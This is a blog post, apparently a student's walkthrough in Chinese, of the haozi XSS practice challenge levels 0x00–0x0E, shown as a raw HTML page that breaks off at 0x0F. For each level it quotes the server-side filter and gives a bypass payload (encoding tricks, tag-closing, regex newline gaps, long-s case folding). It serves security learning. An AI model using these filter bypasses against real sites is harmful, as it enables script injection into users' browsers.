@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>xss - Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x001&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  最简单的 0x011&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  闭合标签 0x021&quot;&gt;&lt;script&gt;alert(1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="https://0xr1ngs.github.io/2018/08/21/xss/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x001&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  最简单的 0x011&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;  闭合标签 0x021&quot;&gt;&lt;script&gt;alert(1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0xr1ngs.github.io/2018/08/21/xss/1.png">
+<meta property="article:published_time" content="2018-08-21T06:02:19.000Z">
+<meta property="article:modified_time" content="2023-07-10T07:27:24.879Z">
+<meta property="article:author" content="r1ngs">
+<meta property="article:tag" content="总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0xr1ngs.github.io/2018/08/21/xss/1.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688978534299">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1688978534299">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1688978534299">
+        
+    
+
+    
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+    <script async src="/js/app.js?v=1688978534299"></script>
+    
+     
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" 
+            style="background-image: url(/images/wallpaper.png)"
+        ></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="r1ngs" class="mdui-btn mdui-btn-icon"><img src="/images/avator.jpg" alt="r1ngs"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="r1ngs">
+            <img src="/images/avator.jpg" alt="r1ngs" alt="r1ngs">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>9</div>
+        <div><span>Categories</span>1</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://github.com/0xr1ngs/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Categories</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 20px;">总结</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(9);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/19/Java-Jndi/">Jndi注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">LGP_内网渗透</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/31/java-random/">java_random</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/28/cbc-bit-flip/">cbc_bit_flip</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/xss/">xss</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+        
+    </aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 r1ngs
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+    <div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="/images/wallpaper.png" alt="xss" loading="lazy">
+            <h1>xss</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2018年08月21日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下</p>
+<p><a target="_blank" rel="noopener" href="https://xss.haozi.me/#/0x00">题目链接</a></p>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最简单的</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合标签</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>原理同上</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这道题waf了小括号 可以用反引号绕过</p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>这道题卡了好久，先来看看server code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>g</code>表示全局匹配，将反引号或 <code>(</code>或 <code>)</code>替换成空<br>这样的话只能考虑一下编码绕过<br>我一开始的想法是使用js编码，但实际测试是不行的<br>在学长的wp下面发现了这篇文章，抢救了我对编码知识的盲区<br><a target="_blank" rel="noopener" href="https://security.yirendai.com/news/share/26">浅谈XSS—字符编码和浏览器解析原理</a><br>文中不同的标签浏览器的解析顺序不同，开头和结尾各给了几个例子<br>原理是因为：<br><strong>小括号、单引号、双引号这些控制字符在js解码的时候仅仅会被解码为文本字符串</strong><br>而只有标识符名称不会被当做字符串，所以不能弹窗<br>这道题有两种办法绕过</p>
+<ul>
+<li><code>&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&gt;</code></li>
+</ul>
+<p>其实两种方法原理都差不多，先来说第一种吧<br>我们前面已经说到过js编码不能绕过过滤的()，所以只能想其他的编码方式<br>而这里使用的是HTML编码，因为我发现在 <code>&lt;script&gt;</code>标签里面的HTML编码是不能被浏览器解析的<br>而这里由于是在img标签内，可以解析HTMl编码，所以还原除了小括号，然后执行了js代码<br>第二个payload其实原理相同，也是svg标签可以HTML编码的原理</p>
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;!--</span><br></pre></td></tr></table></figure>
+
+<p>这道题考察了html注释符后面的感叹号可有可无</p>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>先看看server code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里要注意 <code>|</code>是或的意思，有整体分割的作用，匹配auto或者on.*&#x3D;或者&gt;<br>而且全局匹配且不区分大小写，那么闭合标签和auto事件就不能用了<br>然而正则里面的 <code>.</code>是匹配除”\n”之外的任何单个字符，所以我们使用换行就可以绕过了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再讲讲正则，首先匹配一个 <code>&lt;</code>然后 <code>/</code>有或者没有都可以，再去匹配除了 <code>&gt;</code>的任意字符一个或多个，再以 <code>&gt;</code>结尾<br>这样的话可以利用浏览器的容错性，实际上如果你img标签没有闭合的话浏览器也是可以正常执行的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> </span></span><br></pre></td></tr></table></figure>
+
+<p>而又由于这里的img标签又在article标签中，而且在同一行，所以需要在结尾加上一个空格或者回车浏览器才能正常执行</p>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目的想法也就是不想让你闭合style标签<br>这里的技巧是利用在标签结尾的地方增加空格或者使用回车不影响解析</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于正则只匹配开头而没有匹配结尾，导致后面可以继续植入代码<br>可以先闭合前面的双引号，在后面js标签中再用 <code>//</code>注释掉后面的双引号</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure>
+
+<p>当然也可以用onload事件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot; onload = alert(1) &quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&quot;/g, &#x27;</span><span class="string">&quot;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&lt;/g, &#x27;&lt;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&gt;/g, &#x27;&gt;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/\//g, &#x27;/&#x27;)</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line"><span class="string">  if (domainRe.test(input)) &#123;</span></span><br><span class="line"><span class="string">    return `&lt;script src=&quot;</span>$&#123;escapeHtml(input)&#125;<span class="string">&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return &#x27;Invalid URL&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于这道题目和上一题很像，所以我一开始想到的是闭合双引号，但是在标签的属性值里HTML对双引号编码是无效的，只会当作普通文本，所以只能另外想办法<br>比较好的办法是去引用外部js代码，不过我倒是搜出来很多奇怪的技巧，有用@的（不知道有没有这个方法），有去新注册一个国家级域名的，不过比较好的还是就地取材：<br>在目标url里是一个论坛网站，可以新建一个笔记，内容为 <code>alert(1)</code>然后点击raw功能，引入这个文件就可以了<br>还有一个坑点在于这个替换规则没有使用 <code>;</code>导致 <code>/</code>在编码的时候和后面的数字连在一起成了不可见字符无法识别url<br>在浏览器里按下F12就能看到详细错误<br>链接被识别为了 <code>https://segmentfault.com/n%EF%BF%BD/raw</code><br>解决的办法也很简单，加上 <code>;</code>或者使用换行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com/n/;1330000016099466/raw</span><br><span class="line">https://www.segmentfault.com/n/</span><br><span class="line">1330000016099466/raw</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题的考点在于HTML的标签（包括script）不区分大小写，但是js的函数是区分的<br>正解是用编码绕过，或者引入外部js文件<br>一开始想的是js编码，但是很遗憾 <code>U</code>大写后识别不出来，只能用没有大小写区分的HTML编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和上面一题一样，不能用script，但是由于这里的替换<strong>只替换了一次</strong>，而且是<strong>替换字符串</strong>并且<strong>替换为空</strong>，所以可以用双写绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scripscriptt</span> <span class="attr">src</span>=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scripscriptt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先这里双斜线只能注释单行，回车就可以绕过，还剩下的 <code>&#39;)</code>可以用HTML的注释符 <code>--&gt;</code>饶过<br>这是一个技巧，js里面同样可以用HTML的注释符，各自用一半均有注释一行的效果，而使用 <code>--&gt;</code>的时候前面不能有东西，否则会语法报错</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题将返回的第一个匹配（$1）替换成 <code>&lt;_</code>，首先想到的当然还是编码，我想用HTML编码 <code>img</code>但是后来发现并不行，标签名编码没有用<br>这道题用到的是古英语，<code>ſ</code>大写过后即是 <code>S</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span 